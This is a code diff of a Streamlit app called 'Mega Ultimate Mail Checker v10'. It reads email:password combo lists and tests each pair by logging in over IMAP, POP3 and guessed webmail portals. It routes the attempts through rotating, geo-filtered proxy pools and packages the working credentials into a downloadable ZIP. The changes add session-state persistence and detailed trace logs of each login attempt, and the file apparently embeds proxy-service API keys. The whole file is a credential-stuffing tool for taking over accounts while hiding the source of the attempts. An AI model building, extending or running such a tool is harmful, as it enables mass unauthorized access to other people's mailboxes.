@@ -68,6 +68,28 @@ st.markdown("""
 st.title("⚡ Mega Ultimate Mail Checker v10 (Full Colab-Parity Edition)")
 st.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with advanced proxy modes, geo-filtering, webmail portal checks, and automated ZIP archiving.")
 
+# --- Persistent Session State Initialization ---
+if "engine_has_run" not in st.session_state:
+    st.session_state.engine_has_run = False
+if "valid_results" not in st.session_state:
+    st.session_state.valid_results = []
+if "wrong_results" not in st.session_state:
+    st.session_state.wrong_results = []
+if "need_app_results" not in st.session_state:
+    st.session_state.need_app_results = []
+if "conn_results" not in st.session_state:
+    st.session_state.conn_results = []
+if "report_entries" not in st.session_state:
+    st.session_state.report_entries = []
+if "log_lines" not in st.session_state:
+    st.session_state.log_lines = []
+if "zip_bytes" not in st.session_state:
+    st.session_state.zip_bytes = None
+if "zip_name" not in st.session_state:
+    st.session_state.zip_name = ""
+if "clean_valid_count" not in st.session_state:
+    st.session_state.clean_valid_count = 0
+
 # --- Config & Proxy Lists (Loaded securely via Streamlit Secrets with fallbacks) ---
 _default_webshare = [
     "ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo",
@@ -156,7 +178,6 @@ st.sidebar.markdown("### 🌐 Proxy / Pool Configuration")
 min_proxy_score = st.sidebar.slider("Min Proxy Score", min_value=0, max_value=100, value=40, step=5)
 pool_mode = st.sidebar.selectbox("Pool Mode", options=["all", "us_only", "country", "mix"], index=0)
 
-# --- Helper Functions & State for Proxy Files ---
 cache_lock = threading.Lock()
 proxy_lock = threading.Lock()
 bad_proxies = set()
@@ -167,8 +188,7 @@ def load_json(path, default=None):
         try:
             with open(path, encoding="utf-8") as f:
                 return json.load(f)
-        except Exception as e:
-            print(f"Error loading JSON {path}: {e}")
+        except Exception:
             return default
     return default
 
@@ -182,8 +202,7 @@ def load_proxies():
         with open("proxies.txt", encoding="utf-8", errors="ignore") as f:
             raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
         return [p for p in raw_list if dead_node_signature not in p]
-    except Exception as e:
-        print(f"Error reading proxies file: {e}")
+    except Exception:
         return []
 
 def load_webshare(key):
@@ -207,8 +226,8 @@ def load_webshare(key):
                     else:
                         proxies.append(f"{ip}:{port}")
             return proxies
-    except Exception as e:
-        print(f"Error fetching Webshare proxies for key {key[:5]}...: {e}")
+    except Exception:
+        pass
     return []
 
 def parse_proxy(proxy_str):
@@ -228,19 +247,17 @@ def parse_proxy(proxy_str):
             return {"host": parts[0], "port": int(parts[1]), "user": parts[2], "pass": parts[3]}
         if len(parts) == 2:
             return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
-    except Exception as e:
-        print(f"Proxy parse error for '{proxy_str}': {e}")
+    except Exception:
+        pass
     return None
 
 def compute_real_score(success_count, fail_count, initial_latency_score=80):
     total = success_count + fail_count
     if total == 0:
         return initial_latency_score
-    
     smoothed_success = success_count + 2
     smoothed_fail = fail_count + 1
     smoothed_total = smoothed_success + smoothed_fail
-    
     success_rate = (smoothed_success / smoothed_total) * 100
     score = int(success_rate - (fail_count * 5))
     return max(0, min(100, score))
@@ -251,7 +268,6 @@ def test_single_proxy(proxy_str):
     start = time.time()
     sock = None
     test_success = False
-    
     try:
         sock = socks.create_connection(
             ("8.8.8.8", 53), timeout=3.0,
@@ -277,7 +293,6 @@ def test_single_proxy(proxy_str):
             
     latency = int((time.time() - start) * 1000)
     initial_score = max(0, min(100, 100 - int(latency / 15)))
-    
     country = proxy_meta.get(proxy_str, {}).get("country", "Unknown")
     region = proxy_meta.get(proxy_str, {}).get("region", "Unknown")
 
@@ -295,13 +310,11 @@ def test_single_proxy(proxy_str):
     with proxy_lock:
         if proxy_str not in proxy_meta:
             proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country, "region": region}
-        
         m = proxy_meta[proxy_str]
         if test_success:
             m["success"] = m.get("success", 0) + 1
         else:
             m["fails"] = m.get("fails", 0) + 1
-            
         m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0), initial_latency_score=initial_score)
         m["country"] = country
         m["region"] = region
@@ -321,7 +334,6 @@ def test_single_proxy(proxy_str):
 def get_available_countries_with_scores():
     raw = load_proxies()
     country_scores = defaultdict(list)
-    
     for p in raw:
         meta = proxy_meta.get(p, {})
         c = meta.get("country", "Unknown").upper()
@@ -338,7 +350,6 @@ def get_available_countries_with_scores():
     for c, scores in country_scores.items():
         avg_score = sum(scores) / len(scores) if scores else 0
         avg_country_scores.append((c, avg_score))
-        
     avg_country_scores.sort(key=lambda x: x[1], reverse=True)
     return [item[0] for item in avg_country_scores if item[0] != "UNKNOWN"] + ([ "UNKNOWN" ] if "UNKNOWN" in country_scores else [])
 
@@ -350,12 +361,10 @@ if pool_mode == "country":
     available_countries = get_available_countries_with_scores()
     if not available_countries:
         available_countries = ["US", "GB", "DE", "CA", "FR"]
-    
     with st.sidebar.form("country_form"):
         country_checkboxes = {}
         for c in available_countries:
             country_checkboxes[c] = st.checkbox(c, value=(c == "US"))
-        
         country_done = st.form_submit_button("Done")
         if country_done:
             selected_countries = [c for c, checked in country_checkboxes.items() if checked]
@@ -366,14 +375,12 @@ elif pool_mode == "mix":
     available_countries = get_available_countries_with_scores()
     if not available_countries:
         available_countries = ["US", "GB", "DE", "CA", "FR"]
-        
     with st.sidebar.form("mix_form"):
         mix_checkboxes = {}
         for c in available_countries:
             scores_for_c = [proxy_meta.get(p, {}).get("score", 50) for p in load_proxies() if proxy_meta.get(p, {}).get("country", "").upper() == c]
             avg_s = int(sum(scores_for_c) / len(scores_for_c)) if scores_for_c else 50
             mix_checkboxes[c] = st.checkbox(f"{c} (Avg Score: {avg_s})", value=True)
-            
         mix_done = st.form_submit_button("Done")
         if mix_done:
             selected_mix_countries = [c.split(" ")[0] for c, checked in mix_checkboxes.items() if checked]
@@ -429,24 +436,21 @@ try:
 except Exception:
     pass
 
-with st.sidebar.expander("🔍 View Active Configuration State", expanded=False):
-    st.json(CFG)
-
 def save_domain_cache():
     try:
         with cache_lock:
             with open(CFG["CACHE_FILE"], "w", encoding="utf-8") as f:
                 json.dump(domain_cache, f, indent=2)
-    except Exception as e:
-        print(f"Error saving domain cache: {e}")
+    except Exception:
+        pass
 
 def save_proxy_meta():
     try:
         with proxy_lock:
             with open(CFG["PROXY_META_FILE"], "w", encoding="utf-8") as f:
                 json.dump(proxy_meta, f, indent=2)
-    except Exception as e:
-        print(f"Error saving proxy meta: {e}")
+    except Exception:
+        pass
 
 def get_filtered_active_proxies():
     raw = load_proxies()
@@ -521,10 +525,8 @@ with st.sidebar:
                     all_raw.extend(load_webshare(key))
                 for ox in OXYLABS_PROXIES:
                     all_raw.append(ox)
-                
                 all_raw = list(dict.fromkeys(all_raw))
                 alive = []
-                
                 try:
                     with ThreadPoolExecutor(max_workers=15) as ex:
                         future_to_proxy = {ex.submit(test_single_proxy, proxy): proxy for proxy in all_raw}
@@ -642,7 +644,6 @@ def process_accounts(text, previous_valid):
             if ":" not in line:
                 skipped_bad += 1
                 continue
-
             parts = line.split(":", 1)
             email = parts[0].strip().lower()
             password = parts[1].strip() if len(parts) > 1 else ""
@@ -667,8 +668,8 @@ def process_accounts(text, previous_valid):
                 skipped_bad += 1
                 continue
             lines.append(f"{email}:{password}")
-    except Exception as e:
-        print(f"Account processing error: {e}")
+    except Exception:
+        pass
 
     seen_email, clean = set(), []
     for line in lines:
@@ -793,11 +794,10 @@ def update_proxy_score(proxy_str, success=True):
                 m["fails"] = m.get("fails", 0) + 1
                 if m["fails"] >= 3:
                     bad_proxies.add(proxy_str)
-            
             m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
         save_proxy_meta()
-    except Exception as e:
-        print(f"Proxy score update error: {e}")
+    except Exception:
+        pass
 
 def proxy_connect(host, port, proxy_str, timeout=None):
     base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
@@ -879,7 +879,6 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
 def find_best_webmail_portal(domain, proxies_dict=None):
     if not requests:
         return []
-        
     candidates = [
         f"https://webmail.{domain}",
         f"https://mail.{domain}",
@@ -889,7 +888,6 @@ def find_best_webmail_portal(domain, proxies_dict=None):
         f"https://mail.{domain}/login",
         f"https://auth.{domain}/login"
     ]
-    
     scored_portals = []
     for url in candidates:
         try:
@@ -903,11 +901,9 @@ def find_best_webmail_portal(domain, proxies_dict=None):
                     score += 30
                 if resp.url:
                     score += 10
-                
                 scored_portals.append((score, url))
         except Exception:
             continue
-            
     scored_portals.sort(key=lambda x: x[0], reverse=True)
     return [portal[1] for portal in scored_portals if portal[0] > 0]
 
@@ -923,7 +919,6 @@ def check_webmail_portal(email, password, domain, proxy_str=None):
             proxies_dict = {"http": p_url, "https": p_url}
 
     dynamic_portals = find_best_webmail_portal(domain, proxies_dict)
-    
     fallback_candidates = [
         f"https://{domain}/webmail",
         f"https://mail.{domain}/login",
@@ -931,9 +926,7 @@ def check_webmail_portal(email, password, domain, proxy_str=None):
         f"https://{domain}/login.php",
         f"https://auth.{domain}/login"
     ]
-    
     portal_candidates = dynamic_portals if dynamic_portals else fallback_candidates
-    
     if domain == "empas.com":
         portal_candidates.insert(0, "https://empas.com/webmail")
 
@@ -960,13 +953,16 @@ def check_webmail_portal(email, password, domain, proxy_str=None):
                 return portal_url, "valid", f"Portal (Smart Discovery) | {portal_url}"
         except Exception:
             continue
-            
     return None, "connection_failed", "portal check failed"
 
-def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
+def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
+    if trace_logs is None:
+        trace_logs = []
+        
     try:
         if conf.get("type") == "zero_access":
-            return None, "need_app_password", "Zero-Access Architecture | Protocol: Local API / Bridge", None
+            trace_logs.append("Architecture: Zero-Access / Bridge detected.")
+            return None, "need_app_password", "Zero-Access Architecture | Protocol: Local API / Bridge", None, trace_logs
 
         proxy_mode = CFG.get("PROXY_MODE", "aggressive")
         prefer_insecure = CFG.get("ALLOW_SELF_SIGNED", True)
@@ -977,50 +973,68 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
                 if not thread_state.get("sticky_proxy"):
                     thread_state["sticky_proxy"] = random.choice(proxy_pool)
                 px = thread_state["sticky_proxy"]
+                trace_logs.append(f"Proxy [Sticky Mode Assigned]: {px.split('@')[-1]}")
             else:
                 px = random.choice(proxy_pool)
+                trace_logs.append(f"Proxy [Random Pool Assigned]: {px.split('@')[-1]}")
+        else:
+            trace_logs.append("Proxy Engine: Disabled or Direct Connection.")
 
         proxies_to_try = [px] if px else [None]
         if proxy_mode == "fallback" and px:
             proxies_to_try.append(None)
+            trace_logs.append("Proxy Mode: Fallback enabled (will try direct if proxy fails).")
 
         if CFG.get("ENABLE_SECRET_PORTALS", True):
+            trace_logs.append("Secret Portals: Scanning HTTP webmail portal routes...")
             for current_px in proxies_to_try:
                 portal_srv, portal_st, portal_det = check_webmail_portal(email, password, domain, current_px)
                 if portal_st == "valid":
-                    return portal_srv, "valid", portal_det, current_px
+                    trace_logs.append(f"-> SUCCESS via HTTP Webmail Portal: {portal_det}")
+                    return portal_srv, "valid", portal_det, current_px, trace_logs
                 elif portal_st == "wrong_password":
-                    return None, "wrong_password", portal_det, current_px
+                    trace_logs.append(f"-> FAILED (Wrong Password) via Portal: {portal_det}")
+                    return None, "wrong_password", portal_det, current_px, trace_logs
+                else:
+                    trace_logs.append(f"-> Portal check missed/failed on route: {portal_det}")
 
         for current_px in proxies_to_try:
             for server in conf.get("imap", [])[:3]:
+                trace_logs.append(f"Attempting IMAP Protocol -> Host: {server}:993 (Proxy: {bool(current_px)})")
                 try:
                     imap_once(email, password, server, current_px, insecure=prefer_insecure)
                     if current_px: update_proxy_score(current_px, True)
-                    return server, "valid", f"IMAP | Host: {server} | Port: 993", current_px
+                    trace_logs.append(f"-> SUCCESS: IMAP authenticated successfully on {server}")
+                    return server, "valid", f"IMAP | Host: {server} | Port: 993", current_px, trace_logs
                 except Exception as e:
-                    st = classify_error(str(e), domain)
+                    st_val = classify_error(str(e), domain)
+                    trace_logs.append(f"-> FAILED IMAP on {server}: {str(e)[:50]} [Classified: {st_val}]")
                     if current_px: update_proxy_score(current_px, False)
-                    if st in ("wrong_password", "need_app_password"):
-                        return None, st, f"IMAP {server} -> {st}", current_px
+                    if st_val in ("wrong_password", "need_app_password"):
+                        return None, st_val, f"IMAP {server} -> {st_val}", current_px, trace_logs
 
             for server in conf.get("pop3", [])[:3]:
+                trace_logs.append(f"Attempting POP3 Protocol -> Host: {server}:995 (Proxy: {bool(current_px)})")
                 try:
                     pop_once(email, password, server, current_px, insecure=prefer_insecure)
                     if current_px: update_proxy_score(current_px, True)
-                    return server, "valid", f"POP3 | Host: {server} | Port: 995", current_px
+                    trace_logs.append(f"-> SUCCESS: POP3 authenticated successfully on {server}")
+                    return server, "valid", f"POP3 | Host: {server} | Port: 995", current_px, trace_logs
                 except Exception as e:
-                    st = classify_error(str(e), domain)
+                    st_val = classify_error(str(e), domain)
+                    trace_logs.append(f"-> FAILED POP3 on {server}: {str(e)[:50]} [Classified: {st_val}]")
                     if current_px: update_proxy_score(current_px, False)
-                    if st in ("wrong_password", "need_app_password"):
-                        return None, st, f"POP3 {server} -> {st}", current_px
+                    if st_val in ("wrong_password", "need_app_password"):
+                        return None, st_val, f"POP3 {server} -> {st_val}", current_px, trace_logs
 
     except Exception as e:
-        return None, "connection_failed", str(e)[:40], None
+        trace_logs.append(f"Critical Exception in background check runner: {str(e)}")
+        return None, "connection_failed", str(e)[:40], None, trace_logs
 
-    return None, "connection_failed", "all hosts failed", None
+    trace_logs.append("All protocol endpoints and fallback routes exhausted: connection_failed")
+    return None, "connection_failed", "all hosts failed", None, trace_logs
 
-# --- Execution Trigger & Dual-Tab Report Log Integration ---
+# --- Execution Trigger & Persistent UI Display ---
 st.markdown("---")
 st.markdown("### 🚀 Execute Live Checking Engine")
 
@@ -1030,15 +1044,17 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
     else:
         active_proxy_pool = get_filtered_active_proxies()
         
-        valid_results = []
-        wrong_results = []
-        need_app_results = []
-        conn_results = []
+        st.session_state.valid_results = []
+        st.session_state.wrong_results = []
+        st.session_state.need_app_results = []
+        st.session_state.conn_results = []
+        st.session_state.report_entries = []
+        st.session_state.log_lines = []
+        st.session_state.engine_has_run = True
         
         progress_bar = st.progress(0)
         status_text = st.empty()
         
-        # Dedicated Tabs for Execution Display and Detailed Live Report Log
         exec_tab1, exec_tab2 = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
         
         with exec_tab1:
@@ -1048,9 +1064,6 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
             report_metrics_placeholder = st.empty()
             report_log_container = st.empty()
 
-        log_lines = []
-        report_entries = []
-        
         accounts_to_check = clean_lines[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else clean_lines
         total_accs = len(accounts_to_check)
         checked_count = 0
@@ -1060,7 +1073,7 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
         def check_task(line):
             try:
                 if ":" not in line: 
-                    return {"line": f"{line} | Error: Invalid format", "status": "connection_failed"}
+                    return {"line": f"{line} | Error: Invalid format", "status": "connection_failed", "trace": ["Invalid format"]}
                 email, password = line.split(":", 1)
                 email, password = email.strip(), password.strip()
                 domain = email.split("@")[-1].lower()
@@ -1069,10 +1082,10 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
                 if not hasattr(thread_local, "state"):
                     thread_local.state = {}
                 
-                server, status, detail, px_used = check_account_sync(email, password, conf, domain, active_proxy_pool, thread_local.state)
-                return {"line": f"{email}:{password} | {detail}", "email": email, "status": status, "detail": detail}
+                server, status, detail, px_used, trace = check_account_sync(email, password, conf, domain, active_proxy_pool, thread_local.state)
+                return {"line": f"{email}:{password} | {detail}", "email": email, "status": status, "detail": detail, "trace": trace}
             except Exception as ex:
-                return {"line": f"{line} | Error: {ex}", "email": line, "status": "connection_failed", "detail": str(ex)}
+                return {"line": f"{line} | Error: {ex}", "email": line, "status": "connection_failed", "detail": str(ex), "trace": [str(ex)]}
 
         current_workers = CFG["MAX_WORKERS_START"]
 
@@ -1087,47 +1100,48 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
                         if res:
                             st_val = res["status"]
                             if st_val == "valid":
-                                valid_results.append(res["line"])
+                                st.session_state.valid_results.append(res["line"])
                             elif st_val == "wrong_password":
-                                wrong_results.append(res["line"])
+                                st.session_state.wrong_results.append(res["line"])
                             elif st_val == "need_app_password":
-                                need_app_results.append(res["line"])
+                                st.session_state.need_app_results.append(res["line"])
                             else:
-                                conn_results.append(res["line"])
+                                st.session_state.conn_results.append(res["line"])
                             
                             log_msg = f"[{st_val.upper()}] {res.get('email', '')} -> {res.get('detail', '')}"
-                            log_lines.append(log_msg)
-                            if len(log_lines) > 50:
-                                log_lines.pop(0)
-                            log_container.code("\n".join(log_lines), language="text")
+                            st.session_state.log_lines.append(log_msg)
+                            if len(st.session_state.log_lines) > 50:
+                                st.session_state.log_lines.pop(0)
+                            log_container.code("\n".join(st.session_state.log_lines), language="text")
 
-                            # Update Dedicated Report Log Tab
-                            report_entries.append({
+                            # Detailed Background Trace formatting for Analytics Log
+                            trace_text = "\n  ↳ ".join(res.get("trace", ["No trace recorded"]))
+                            st.session_state.report_entries.append({
                                 "Time": datetime.now().strftime("%H:%M:%S"),
                                 "Email": res.get("email", ""),
                                 "Status": st_val.upper(),
-                                "Detail": res.get("detail", "")
+                                "Under-The-Hood Background Trace": f"Result: {res.get('detail', '')}\nSteps Executed:\n  ↳ {trace_text}"
                             })
                             
                             with report_metrics_placeholder.container():
                                 r_col1, r_col2, r_col3, r_col4 = st.columns(4)
-                                r_col1.metric("✅ Valid", len(valid_results))
-                                r_col2.metric("❌ Wrong", len(wrong_results))
-                                r_col3.metric("🔑 AppPass", len(need_app_results))
-                                r_col4.metric("⚠️ Failed", len(conn_results))
+                                r_col1.metric("✅ Valid", len(st.session_state.valid_results))
+                                r_col2.metric("❌ Wrong", len(st.session_state.wrong_results))
+                                r_col3.metric("🔑 AppPass", len(st.session_state.need_app_results))
+                                r_col4.metric("⚠️ Failed", len(st.session_state.conn_results))
 
-                            df_report = pd.DataFrame(report_entries[::-1]) # Latest first
-                            report_log_container.dataframe(df_report, width='stretch', height=250)
+                            df_report = pd.DataFrame(st.session_state.report_entries[::-1])
+                            report_log_container.dataframe(df_report, width='stretch', height=300)
                             
                     except Exception as ex:
                         err_msg = f"[EXCEPTION] {str(ex)}"
-                        conn_results.append(err_msg)
-                        log_lines.append(err_msg)
-                        log_container.code("\n".join(log_lines), language="text")
+                        st.session_state.conn_results.append(err_msg)
+                        st.session_state.log_lines.append(err_msg)
+                        log_container.code("\n".join(st.session_state.log_lines), language="text")
                     
                     if total_accs > 0:
                         progress_bar.progress(min(1.0, checked_count / total_accs))
-                    status_text.text(f"Checking... {checked_count}/{total_accs} | Valid: {len(valid_results)} | Wrong: {len(wrong_results)}")
+                    status_text.text(f"Checking... {checked_count}/{total_accs} | Valid: {len(st.session_state.valid_results)} | Wrong: {len(st.session_state.wrong_results)}")
         except Exception as ex:
             st.error(f"Execution thread block error: {ex}")
 
@@ -1142,30 +1156,30 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
             failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
 
             with open(valid_path, "w", encoding="utf-8") as f:
-                f.write("\n".join(str(item) for item in valid_results) + ("\n" if valid_results else ""))
+                f.write("\n".join(str(item) for item in st.session_state.valid_results) + ("\n" if st.session_state.valid_results else ""))
             with open(wrong_path, "w", encoding="utf-8") as f:
-                f.write("\n".join(str(item) for item in wrong_results) + ("\n" if wrong_results else ""))
+                f.write("\n".join(str(item) for item in st.session_state.wrong_results) + ("\n" if st.session_state.wrong_results else ""))
             with open(need_path, "w", encoding="utf-8") as f:
-                f.write("\n".join(str(item) for item in need_app_results) + ("\n" if need_app_results else ""))
+                f.write("\n".join(str(item) for item in st.session_state.need_app_results) + ("\n" if st.session_state.need_app_results else ""))
             with open(failed_path, "w", encoding="utf-8") as f:
-                f.write("\n".join(str(item) for item in conn_results) + ("\n" if conn_results else ""))
+                f.write("\n".join(str(item) for item in st.session_state.conn_results) + ("\n" if st.session_state.conn_results else ""))
 
             clean_valid_path = "clean_valid_accounts.txt"
-            clean_valid_count = 0
+            st.session_state.clean_valid_count = 0
             with open(clean_valid_path, "w", encoding="utf-8") as outfile:
-                for line in valid_results:
+                for line in st.session_state.valid_results:
                     try:
                         parts = line.split(":")
                         if len(parts) >= 2:
                             email = parts[0].strip()
                             password_part = parts[1].split("|")[0].strip()
                             outfile.write(f"{email}:{password_part}\n")
-                            clean_valid_count += 1
+                            st.session_state.clean_valid_count += 1
                     except Exception:
                         continue
 
-            zip_name = f"mail_results_{stamp}.zip"
-            with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
+            st.session_state.zip_name = f"mail_results_{stamp}.zip"
+            with zipfile.ZipFile(st.session_state.zip_name, "w", zipfile.ZIP_DEFLATED) as z:
                 if os.path.exists(clean_valid_path):
                     z.write(clean_valid_path, arcname="valid_email_password.txt")
                 if os.path.exists(wrong_path):
@@ -1175,27 +1189,45 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
                 if os.path.exists(failed_path):
                     z.write(failed_path, arcname=os.path.basename(failed_path))
 
-            st.markdown("---")
-            st.markdown("### 📊 Live Results Summary & ZIP Archive")
-            col1, col2, col3, col4 = st.columns(4)
-            col1.metric("✅ Clean Valid", clean_valid_count)
-            col2.metric("❌ Wrong Password", len(wrong_results))
-            col3.metric("🔑 App Password / 2FA", len(need_app_results))
-            col4.metric("⚠️ Connection Failed", len(conn_results))
-            
-            if valid_results:
-                st.markdown("#### ✅ Valid Accounts Found:")
-                for v in valid_results:
-                    st.code(v, language="text")
+            with open(st.session_state.zip_name, "rb") as fp:
+                st.session_state.zip_bytes = fp.read()
 
-            with open(zip_name, "rb") as fp:
-                zip_bytes = fp.read()
-
-            st.download_button(
-                label="📦 Download All Results (.zip Package)",
-                data=zip_bytes,
-                file_name=zip_name,
-                mime="application/zip"
-            )
         except Exception as ex:
             st.error(f"Error compiling results export files: {ex}")
+
+# --- Render Persistent Results Permanently If Engine Has Run ---
+if st.session_state.engine_has_run:
+    st.markdown("---")
+    st.markdown("### 📊 Live Results Summary & ZIP Archive")
+    col1, col2, col3, col4 = st.columns(4)
+    col1.metric("✅ Clean Valid", st.session_state.clean_valid_count)
+    col2.metric("❌ Wrong Password", len(st.session_state.wrong_results))
+    col3.metric("🔑 App Password / 2FA", len(st.session_state.need_app_results))
+    col4.metric("⚠ Connection Failed", len(st.session_state.conn_results))
+    
+    if st.session_state.valid_results:
+        st.markdown("#### ✅ Valid Accounts Found:")
+        for v in st.session_state.valid_results:
+            st.code(v, language="text")
+
+    exec_tab1_p, exec_tab2_p = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
+    with exec_tab1_p:
+        if st.session_state.log_lines:
+            st.code("\n".join(st.session_state.log_lines), language="text")
+        else:
+            st.info("No logs available from previous run.")
+            
+    with exec_tab2_p:
+        if st.session_state.report_entries:
+            df_report_persisted = pd.DataFrame(st.session_state.report_entries[::-1])
+            st.dataframe(df_report_persisted, width='stretch', height=300)
+        else:
+            st.info("No report logs available.")
+
+    if st.session_state.zip_bytes and st.session_state.zip_name:
+        st.download_button(
+            label="📦 Download All Results (.zip Package)",
+            data=st.session_state.zip_bytes,
+            file_name=st.session_state.zip_name,
+            mime="application/zip"
+        )
